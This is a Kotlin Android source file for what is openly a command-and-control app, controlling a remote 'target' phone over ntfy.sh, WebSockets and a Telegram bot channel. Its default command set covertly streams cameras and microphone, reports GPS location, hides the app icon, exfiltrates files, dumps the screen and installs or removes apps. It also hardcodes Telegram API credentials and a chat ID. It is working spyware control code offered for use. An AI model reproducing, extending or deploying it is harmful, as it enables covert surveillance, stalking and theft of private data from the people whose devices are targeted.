package com.c2c

import android.annotation.SuppressLint
import android.app.Application
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.camera2.CameraManager
import android.location.LocationManager
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.widget.Toast
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateMapOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.c2c.data.local.AppDatabase
import com.c2c.data.local.CommandEntity
import com.c2c.webrtc.WebRtcManager
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.websocket.Frame
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive // CRITICAL FIX: Import isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.drinkless.tdlib.Client
import org.drinkless.tdlib.TdApi
import org.json.JSONArray
import org.json.JSONObject
import org.webrtc.MediaStream
import org.webrtc.VideoTrack
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

data class QueuedCommand(val uiKey: String, val cmd: String, val arg: String, val isLive: Boolean = false)

data class AppSettings(
    val ntfyUrl: String, val ntfyTopic: String, val serverIp: String, val port: String,
    val apiId: String, val apiHash: String, val chatId: String
)

class CoreViewModel(application: Application) : AndroidViewModel(application) {
    
    private val appCtx = application
    private val prefs = application.getSharedPreferences("CoreConfig", Context.MODE_PRIVATE)
    
    private val database = AppDatabase.getDatabase(application)
    private val commandDao = database.commandDao()
    private val httpClient = HttpClient(CIO) { engine { requestTimeout = 65_000 } }
    
    val webRtcManager = WebRtcManager(application) { sdpJsonString ->
        sendLive("webrtc_signaling", sdpJsonString)
    }

    private val _commands = MutableStateFlow<List<CommandEntity>>(emptyList())
    val commands: StateFlow<List<CommandEntity>> = _commands.asStateFlow()

    // --- Resilient Queue Engine State ---
    private val _pendingCommands = MutableStateFlow<Set<String>>(emptySet())
    val pendingCommands = _pendingCommands.asStateFlow()
    private var commandQueue = Channel<QueuedCommand>(Channel.UNLIMITED)
    private var workerJob: Job? = null
    private val isNetworkAvailable = MutableStateFlow(true)
    val toggleStates = mutableStateMapOf<String, Boolean>() // UI toggle states

    var remoteVideoTrack by mutableStateOf<VideoTrack?>(null)

    var serverLogs = mutableStateListOf<String>()
    var latestSlabTxt by mutableStateOf(ServerCore.lastStatusSlab)

    var tdLogs = mutableStateListOf<String>()
    var tgMessages = mutableStateListOf<TgMessage>()
    var tgChatName by mutableStateOf("Target Node")
    var tgChatId by mutableStateOf(0L)

    private val cameraManager = application.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private val audioManager = application.getSystemService(Context.AUDIO_SERVICE) as AudioManager
    private val locationManager = application.getSystemService(Context.LOCATION_SERVICE) as LocationManager

    var tdClient: Client? = null
    var tdAuthState by mutableStateOf(TdAuthState.CLOSED)
    var isTdLibEngineRunning by mutableStateOf(false)

    init {
        webRtcManager.initialize()
        loadLocalChatHistory()
        monitorNetwork()
        startQueueWorkers()

        viewModelScope.launch(Dispatchers.IO) {
            commandDao.getAllCommands().collect { list ->
                if (list.isEmpty()) seedDefaultCommands()
                else _commands.value = list.sortedBy { it.label } // Sort alphabetically initially
            }
        }

        viewModelScope.launch(Dispatchers.Main) {
            ServerCore.logsFlow.collect { log ->
                if (log.contains("RECV:") && log.contains("\"cmd\":\"webrtc_signaling\"")) {
                    try {
                        val wrapper = JSONObject(log.substringAfter("RECV: "))
                        val payload = JSONObject(wrapper.getString("arg"))
                        webRtcManager.handleSignalingMessage(payload)
                    } catch (e: Exception) {}
                }
                if (serverLogs.size > 150) serverLogs.removeAt(0)
                serverLogs.add(log)
                latestSlabTxt = ServerCore.lastStatusSlab
            }
        }
    }

    // --- Settings Engine ---
    fun getSettings(): AppSettings {
        return AppSettings(
            ntfyUrl = prefs.getString("ntfyUrl", "https://ntfy.sh") ?: "https://ntfy.sh",
            ntfyTopic = prefs.getString("ntfyTopic", "sys_linker_initial_comm_channel_xyz789") ?: "sys_linker_initial_comm_channel_xyz789",
            serverIp = prefs.getString("serverIp", "0.0.0.0") ?: "0.0.0.0", // This is local Ktor binding. Actual public IP needs external lookup.
            port = prefs.getInt("port", 8765).toString(),
            apiId = prefs.getInt("tdApiId", 25029226).toString(),
            apiHash = prefs.getString("tdApiHash", "9943012755ea9fab57b4f7e42eeb99c6") ?: "9943012755ea9fab57b4f7e42eeb99c6",
            chatId = prefs.getLong("tdTargetChatId", 7956541572L).toString()
        )
    }

    fun saveSettings(settings: AppSettings) {
        prefs.edit()
            .putString("ntfyUrl", settings.ntfyUrl)
            .putString("ntfyTopic", settings.ntfyTopic)
            .putString("serverIp", settings.serverIp)
            .putInt("port", settings.port.toIntOrNull() ?: 8765)
            .putInt("tdApiId", settings.apiId.toIntOrNull() ?: 25029226)
            .putString("tdApiHash", settings.apiHash)
            .putLong("tdTargetChatId", settings.chatId.toLongOrNull() ?: 7956541572L)
            .apply()
        ServerCore.log("Core Settings Applied.", true)
    }

    // --- Resilient Queue Engine ---
    private fun monitorNetwork() {
        val connectivityManager = appCtx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val request = NetworkRequest.Builder().addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
        connectivityManager.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) { isNetworkAvailable.value = true }
            override fun onLost(network: Network) { isNetworkAvailable.value = false }
        })
    }

    private fun startQueueWorkers() {
        workerJob?.cancel() // Cancel any previous workers
        commandQueue.cancel() // Clear and close the old channel
        commandQueue = Channel(Channel.UNLIMITED) // Create a new channel
        _pendingCommands.value = emptySet() // Clear pending UI states

        workerJob = viewModelScope.launch(Dispatchers.IO) {
            repeat(3) { workerId -> // Strictly 3 parallel executors
                launch {
                    for (task in commandQueue) {
                        processTask(task)
                    }
                }
            }
        }
    }

    private suspend fun processTask(task: QueuedCommand) {
        var success = false
        while (!success) {
            // Check if command was aborted by Kill Switch or explicit UI action
            if (!_pendingCommands.value.contains(task.uiKey)) {
                ServerCore.log("ABORTED: ${task.cmd} (${task.uiKey})", false)
                return
            }

            isNetworkAvailable.first { it } // Suspend until network is available

            try {
                if (task.isLive) { // Send via Ktor WebSocket
                    val json = if(task.arg.isNotBlank()) """{"cmd":"${task.cmd}","arg":"${task.arg}"}""" else """{"cmd":"${task.cmd}"}"""
                    ServerCore.liveSessions.forEach { session ->
                        if (session.isActive) session.send(Frame.Text(json)) // CRITICAL FIX: Ensure session is active here
                    }
                    ServerCore.log("LIVE SENT: ${task.cmd}", true)
                } else { // Send via Ntfy (HTTP POST)
                    val url = prefs.getString("ntfyUrl", "https://ntfy.sh")!!
                    val topic = prefs.getString("ntfyTopic", "sys_linker_initial_comm_channel_xyz789")!!
                    val targetUrl = if (url.startsWith("http")) "${url.trimEnd('/')}/$topic" else "https://$url/${topic.trimEnd('/')}"
                    
                    val payload = if (task.arg.isNotBlank()) {
                        """{"cmd": "${task.cmd.replace("\"", "\\\"")}", "arg": "${task.arg.replace("\"", "\\\"")}"}"""
                    } else {
                        """{"cmd": "${task.cmd.replace("\"", "\\\"")}"}"""
                    }

                    httpClient.post(targetUrl) { setBody(payload) }
                    ServerCore.log("NTFY SENT: ${task.cmd}", true)
                }
                success = true
            } catch (e: Exception) {
                ServerCore.log("NETWORK/LIVE ERROR: ${task.cmd} (${task.uiKey}) paused. Retrying...", false)
                delay(3000) // Backoff before retry
            }
        }
        _pendingCommands.update { it - task.uiKey } // Remove from pending after successful send
    }

    // Command API
    fun enqueueCommand(cmd: String, arg: String = "", uiKey: String = cmd, isLive: Boolean = false) {
        _pendingCommands.update { it + uiKey }
        commandQueue.trySend(QueuedCommand(uiKey, cmd, arg, isLive))
        ServerCore.log("QUEUED: $cmd (Key: $uiKey)")
    }

    fun activateKillSwitch() {
        ServerCore.log("KILL SWITCH ENGAGED: Purging command queue and resetting workers.", false)
        startQueueWorkers() // Re-initializes everything, clearing queue and pending states
    }

    // --- Database Operations ---
    fun addCommand(command: CommandEntity) {
        viewModelScope.launch(Dispatchers.IO) {
            commandDao.insertCommand(command)
            ServerCore.log("Command saved: ${command.label}", true)
        }
    }

    fun deleteCommand(command: CommandEntity) {
        viewModelScope.launch(Dispatchers.IO) {
            commandDao.deleteCommand(command)
            ServerCore.log("Command deleted: ${command.label}", true)
        }
    }

    private suspend fun seedDefaultCommands() {
        val defaults = listOf(
            // Quick Actions
            CommandEntity(id=1, label = "Flash On", cmd = "flash", defaultArg = "on", icon = "flashlight_on", category = "Quick", isToggle = true, toggledLabel = "Flash Off", toggledCmd = "flash", toggledArg = "off"),
            CommandEntity(id=2, label = "Cam Front", cmd = "stream_cam_front", defaultArg = "start", icon = "camera_front", category = "Quick", isToggle = true, toggledLabel = "Cam Front Off", toggledCmd = "stream_cam_front", toggledArg = "stop"),
            CommandEntity(id=3, label = "Cam Back", cmd = "stream_cam_back", defaultArg = "start", icon = "camera_rear", category = "Quick", isToggle = true, toggledLabel = "Cam Back Off", toggledCmd = "stream_cam_back", toggledArg = "stop"),
            CommandEntity(id=4, label = "Mic Record", cmd = "live_audio_mode", defaultArg = "mic", icon = "mic", category = "Quick", isToggle = true, toggledLabel = "Mic Off", toggledCmd = "live_audio_mode", toggledArg = "off"),
            CommandEntity(id=5, label = "Location", cmd = "loc", defaultArg = "", icon = "location", category = "Quick"),
            CommandEntity(id=6, label = "Volume 100%", cmd = "vol", defaultArg = "100", icon = "volume_up", category = "Quick", isToggle = true, toggledLabel = "Volume 0%", toggledCmd = "vol", toggledArg = "0"),

            // System Directives
            CommandEntity(id=10, label = "Ping Target", cmd = "ping", defaultArg = "", icon = "radar", category = "System"),
            CommandEntity(id=11, label = "Full Intel", cmd = "info", defaultArg = "", icon = "info", category = "System"),
            CommandEntity(id=12, label = "Extract Logs", cmd = "get_log", defaultArg = "", icon = "description", category = "System"),
            CommandEntity(id=13, label = "Clear Logs", cmd = "clear_log", defaultArg = "", icon = "delete_sweep", category = "System"),
            CommandEntity(id=14, label = "Hide Icon", cmd = "icon_hide", defaultArg = "", icon = "visibility_off", category = "System", isToggle = true, toggledLabel = "Show Icon", toggledCmd = "icon_show", toggledArg = ""),
            CommandEntity(id=15, label = "Toggle Wi-Fi", cmd = "toggle_wifi", defaultArg = "on", icon = "wifi", category = "System", isToggle = true, toggledLabel = "Toggle Wi-fi", toggledCmd = "toggle_wifi", toggledArg = "off"),
            CommandEntity(id=16, label = "Toggle Hotspot", cmd = "toggle_hotspot", defaultArg = "on", icon = "router", category = "System", isToggle = true, toggledLabel = "Toggle Hotspot", toggledCmd = "toggle_hotspot", toggledArg = "off"),
            CommandEntity(id=17, label = "Scan Wi-Fi", cmd = "scan_wifi", defaultArg = "", icon = "network_wifi", category = "System"),
            CommandEntity(id=18, label = "Scan Bluetooth", cmd = "scan_bt", defaultArg = "", icon = "bluetooth", category = "System"),

            // App Management
            CommandEntity(id=20, label = "App Install", cmd = "install_app", defaultArg = "/sdcard/app.apk", icon = "system_update", category = "App Mgmt"),
            CommandEntity(id=21, label = "App Uninstall", cmd = "uninstall_app", defaultArg = "com.whatsapp", icon = "delete_sweep", category = "App Mgmt"),
            CommandEntity(id=22, label = "Download URL", cmd = "download_url", defaultArg = "{\"url\":\"https://example.com/file.apk\", \"path\":\"/sdcard/download.apk\"}", icon = "cloud_download", category = "App Mgmt"),
            CommandEntity(id=23, label = "Extract File", cmd = "send", defaultArg = "my_private_doc.pdf", icon = "upload_file", category = "App Mgmt"),
            CommandEntity(id=24, label = "File Manager", cmd = "fm_ls", defaultArg = "/sdcard", icon = "folder", category = "App Mgmt"),

            // Workflow & Automation
            CommandEntity(id=30, label = "Dump Screen", cmd = "dump_screen", defaultArg = "", icon = "screenshot_monitor", category = "Automation"),
            CommandEntity(id=31, label = "Track Macro", cmd = "track_activity", defaultArg = "10, temp_macro", icon = "track_changes", category = "Automation"),
            CommandEntity(id=32, label = "Perform Macro", cmd = "perform", defaultArg = "2, 1, temp_macro", icon = "play_arrow", category = "Automation"),
            CommandEntity(id=33, label = "Workflow Send", cmd = "workflow", defaultArg = "default", icon = "account_tree", category = "Automation"),
            CommandEntity(id=34, label = "WF Status", cmd = "status_workflow", defaultArg = "default", icon = "description", category = "Automation"),
            CommandEntity(id=35, label = "Halt Workflow", cmd = "halt_workflow", defaultArg = "all", icon = "stop", category = "Automation", isToggle = true, toggledLabel = "Resume Workflow", toggledCmd = "resume_workflow", toggledArg = "all"),

            // Live Communications
            CommandEntity(id=40, label = "VoIP Call", cmd = "call", defaultArg = "nm, loud", icon = "phone", category = "Live Comm", isToggle = true, toggledLabel = "End Call", toggledCmd = "end_call", toggledArg = ""),
        )
        defaults.forEach { commandDao.insertCommand(it) }
    }

    // --- WebRTC ---
    fun initiateWebRtcConnection() {
        webRtcManager.createPeerConnection(isCaller = true) { stream ->
            if (stream.videoTracks.isNotEmpty()) {
                remoteVideoTrack = stream.videoTracks[0]
            }
        }
        enqueueCommand("start_webrtc", "", "live_rtc_init", isLive = false) // Start WebRTC handshake via Ntfy
    }

    fun terminateWebRtcConnection() {
        webRtcManager.peerConnection?.close()
        webRtcManager.peerConnection = null
        remoteVideoTrack = null
        // Also send a command to the client to stop its capturers
        sendLive("live_screen_cast", "stop") // Stops screen capturer
        sendLive("stream_cam_front", "stop") // Stops camera capturer
        sendLive("stream_cam_back", "stop") // Stops camera capturer
        sendLive("live_audio_mode", "off") // Stops audio capturer
    }

    fun tdLog(msg: String, type: String = "INFO") {
        val time = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
        viewModelScope.launch(Dispatchers.Main) {
            if (tdLogs.size > 1000) tdLogs.removeAt(0)
            tdLogs.add("[$time] [$type] $msg")
        }
    }

    fun dumpTdLogs(context: Context) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val file = File(dir, "TDLib_Diagnostic_Log_${System.currentTimeMillis()}.txt")
                file.writeText(tdLogs.joinToString("\n"))
                withContext(Dispatchers.Main) { Toast.makeText(context, "Logs dumped to Downloads folder!", Toast.LENGTH_LONG).show() }
            } catch (e: Exception) { tdLog("Dump Failed: ${e.message}", "ERROR") }
        }
    }

    private fun sendTd(query: TdApi.Function<*>, onResult: ((TdApi.Object) -> Unit)? = null) {
        try {
            tdClient?.send(query) { res ->
                if (res is TdApi.Error) tdLog("${query.javaClass.simpleName} Failed: [${res.code}] ${res.message}", "ERROR")
                else onResult?.invoke(res)
            }
        } catch (e: Exception) {
            tdLog("Exception executing ${query.javaClass.simpleName}: ${e.message}", "ERROR")
        }
    }

    fun toggleTdLib() {
        if (isTdLibEngineRunning) {
            tdLog("Initiating Engine Shutdown...", "INFO")
            sendTd(TdApi.Close()) { tdAuthState = TdAuthState.CLOSED; isTdLibEngineRunning = false; tdLog("Engine Offline", "SUCCESS") }
            tdClient = null
        } else {
            tdLog("Igniting TDLib Core Engine...", "INFO")
            isTdLibEngineRunning = true
            tdAuthState = TdAuthState.INIT
            tgMessages.clear()
            Client.execute(TdApi.SetLogVerbosityLevel().apply { newVerbosityLevel = 1 })
            tdClient = Client.create({ update -> handleTdUpdate(update) }, { e -> tdLog("JNI Exception: ${e.message}", "ERROR") }, { e -> tdLog("JNI Crash: ${e.message}", "ERROR") })
        }
    }

    private fun handleTdUpdate(update: TdApi.Object) {
        viewModelScope.launch(Dispatchers.Main) {
            when (update) {
                is TdApi.UpdateAuthorizationState -> {
                    tdLog("Auth State Shift: ${update.authorizationState.javaClass.simpleName}", "INFO")
                    when (update.authorizationState) {
                        is TdApi.AuthorizationStateWaitTdlibParameters -> {
                            val settings = getSettings() // Use current settings for init
                            val params = TdApi.SetTdlibParameters().apply {
                                useTestDc = false
                                databaseDirectory = File(appCtx.filesDir, "tdlib").absolutePath
                                useMessageDatabase = true
                                useSecretChats = true
                                apiId = settings.apiId.toIntOrNull() ?: 25029226
                                apiHash = settings.apiHash
                                systemLanguageCode = "en"
                                deviceModel = Build.MODEL
                                applicationVersion = "1.0"
                            }
                            sendTd(params)
                        }
                        is TdApi.AuthorizationStateWaitPhoneNumber -> tdAuthState = TdAuthState.WAIT_PHONE
                        is TdApi.AuthorizationStateWaitCode -> tdAuthState = TdAuthState.WAIT_CODE
                        is TdApi.AuthorizationStateWaitPassword -> tdAuthState = TdAuthState.WAIT_PASSWORD
                        is TdApi.AuthorizationStateReady -> {
                            tdAuthState = TdAuthState.READY
                            tgChatId = getSettings().chatId.toLongOrNull() ?: 7956541572L // Use current settings for chat ID
                            tdLog("Engine Authenticated. Target Chat ID: $tgChatId", "SUCCESS")
                            if (tgChatId != 0L) fetchChatHistory() else tdLog("Target Chat ID is 0. Cannot fetch history.", "WARN")
                        }
                        is TdApi.AuthorizationStateClosed -> { tdAuthState = TdAuthState.CLOSED; isTdLibEngineRunning = false }
                    }
                }
                is TdApi.UpdateConnectionState -> tdLog("Connection Matrix: ${update.state.javaClass.simpleName}", "INFO")
                is TdApi.Error -> tdLog("TDLib Internal Error: [${update.code}] ${update.message}", "ERROR")
                is TdApi.UpdateNewMessage -> {
                    val msg = update.message
                    if (msg.chatId == tgChatId) {
                        val content = msg.content
                        if (content is TdApi.MessageText) {
                            tgMessages.add(TgMessage(msg.id, content.text.text, msg.isOutgoing, msg.date * 1000L))
                            tgMessages.sortBy { it.timestamp }
                            saveLocalChatHistory()
                            tdLog("Received Message: ${content.text.text}", "INFO")
                            if (!msg.isOutgoing) executeHardwareCommand(content.text.text)
                        }
                    }
                }
            }
        }
    }

    fun tdSendPhone(phone: String) { tdLog("Submitting Phone...", "INFO"); sendTd(TdApi.SetAuthenticationPhoneNumber().apply { phoneNumber = phone }) }
    fun tdSendCode(code: String) { tdLog("Submitting OTP...", "INFO"); sendTd(TdApi.CheckAuthenticationCode().apply { this.code = code }) }
    fun tdSendPassword(pass: String) { tdLog("Submitting 2FA...", "INFO"); sendTd(TdApi.CheckAuthenticationPassword().apply { password = pass }) }

    private fun fetchChatHistory() {
        tdLog("Requesting Chat Data for ID: $tgChatId...", "INFO")
        sendTd(TdApi.LoadChats().apply { chatList = null; limit = 100 })
        sendTd(TdApi.GetChat().apply { chatId = tgChatId }) { chat -> 
            if (chat is TdApi.Chat) {
                tdLog("Chat Identity Confirmed: ${chat.title}", "SUCCESS")
                viewModelScope.launch(Dispatchers.Main) { tgChatName = chat.title } 
            }
        }
        sendTd(TdApi.GetChatHistory().apply { chatId = tgChatId; limit = 50 }) { res ->
            if (res is TdApi.Messages) {
                tdLog("History Extracted: ${res.messages.size} messages found.", "SUCCESS")
                viewModelScope.launch(Dispatchers.Main) {
                    val newMsgs = res.messages.filter { it.content is TdApi.MessageText }.map { msg ->
                        TgMessage(msg.id, (msg.content as TdApi.MessageText).text.text, msg.isOutgoing, msg.date * 1000L)
                    }
                    tgMessages.clear()
                    tgMessages.addAll(newMsgs.reversed())
                    saveLocalChatHistory()
                }
            }
        }
    }

    fun sendTelegramMessage(text: String, isMe: Boolean = true) {
        if (tgChatId == 0L || tdClient == null) {
            tdLog("Cannot send message. Engine offline or Chat ID is 0.", "ERROR")
            return
        }
        viewModelScope.launch(Dispatchers.Main) {
            tgMessages.add(TgMessage(System.currentTimeMillis(), text, isMe, System.currentTimeMillis()))
            saveLocalChatHistory()
        }
        if (isMe) {
            viewModelScope.launch(Dispatchers.IO) {
                tdLog("Dispatching Payload...", "INFO")
                val formattedText = TdApi.FormattedText().apply { this.text = text; this.entities = emptyArray() }
                val inputContent = TdApi.InputMessageText().apply { this.text = formattedText }
                val request = TdApi.SendMessage().apply { this.chatId = tgChatId; this.inputMessageContent = inputContent }
                sendTd(request) { tdLog("Payload Sent Successfully.", "SUCCESS") }
            }
        }
    }

    private fun loadLocalChatHistory() {
        try {
            val arr = JSONArray(prefs.getString("tg_history", "[]"))
            tgMessages.clear()
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                tgMessages.add(TgMessage(obj.getLong("id"), obj.getString("text"), obj.getBoolean("isMe"), obj.getLong("timestamp")))
            }
        } catch (e: Exception) {}
    }

    private fun saveLocalChatHistory() {
        val arr = JSONArray()
        tgMessages.forEach { msg -> arr.put(JSONObject().put("id", msg.id).put("text", msg.text).put("isMe", msg.isMe).put("timestamp", msg.timestamp)) }
        prefs.edit().putString("tg_history", arr.toString()).apply()
    }

    @SuppressLint("MissingPermission")
    private fun executeHardwareCommand(cmdString: String) {
        val parts = cmdString.split(" ")
        val cmd = parts[0].lowercase().removePrefix("/")
        val arg = if (parts.size > 1) parts[1] else ""
        viewModelScope.launch(Dispatchers.IO) {
            when (cmd) {
                "ping" -> {
                    val bat = appCtx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                    sendTelegramMessage("🟢 Node Online.\n🔋 Battery: $bat%")
                }
                "loc" -> {
                    sendTelegramMessage("🛰️ Fetching GPS...")
                    try {
                        val loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                        if (loc != null) sendTelegramMessage("📍 <b>Location Acquired:</b>\nLat: ${loc.latitude}\nLng: ${loc.longitude}") else sendTelegramMessage("❌ Location unavailable.")
                    } catch (e: Exception) { sendTelegramMessage("❌ GPS Error") }
                }
                "flash" -> {
                    try {
                        val state = arg.lowercase() == "on"
                        cameraManager.setTorchMode(cameraManager.cameraIdList[0], state)
                        sendTelegramMessage(if (state) "🔦 Flashlight Enabled" else "🔦 Flashlight Disabled")
                    } catch (e: Exception) { sendTelegramMessage("❌ Camera Hardware Error.") }
                }
                "vol" -> {
                    val targetVol = arg.toIntOrNull() ?: 50
                    val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                    audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, (targetVol * max) / 100, 0)
                    sendTelegramMessage("🔊 Volume set to $targetVol%")
                }
                "live_start" -> { sendTelegramMessage("⚡ Initiating Live WebSocket..."); toggleServer(appCtx) }
                "live_stop" -> { ServerCore.ktorServer?.stop(1000, 2000); ServerCore.isRunning = false; sendTelegramMessage("🛑 Core Node Terminated.") }
            }
        }
    }

    fun sendLive(cmd: String, arg: String = "") {
        viewModelScope.launch(Dispatchers.IO) {
            if (ServerCore.liveSessions.isNotEmpty()) {
                val json = if(arg.isNotBlank()) """{"cmd":"$cmd","arg":"$arg"}""" else """{"cmd":"$cmd"}"""
                ServerCore.liveSessions.forEach { session -> 
                    // This is for Ktor's WebSocketServerSession.send, not a generic coroutine send.
                    // It should implicitly handle if the session is active.
                    try { session.send(Frame.Text(json)) } catch(e: Exception){ ServerCore.log("LIVE SEND ERROR to ${session.call.request.local.remoteHost}: ${e.message}", false) } 
                }
            } else {
                ServerCore.log("WARN: No live WebSocket sessions active to send command: $cmd", false)
            }
        }
    }

    fun toggleServer(context: Context) {
        val currentSettings = getSettings()
        val port = currentSettings.port.toIntOrNull() ?: 8765
        val intent = Intent(context, C2ServerService::class.java).apply { putExtra("port", port) }
        if (ServerCore.isRunning) { context.stopService(intent) } else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent) }
    }
}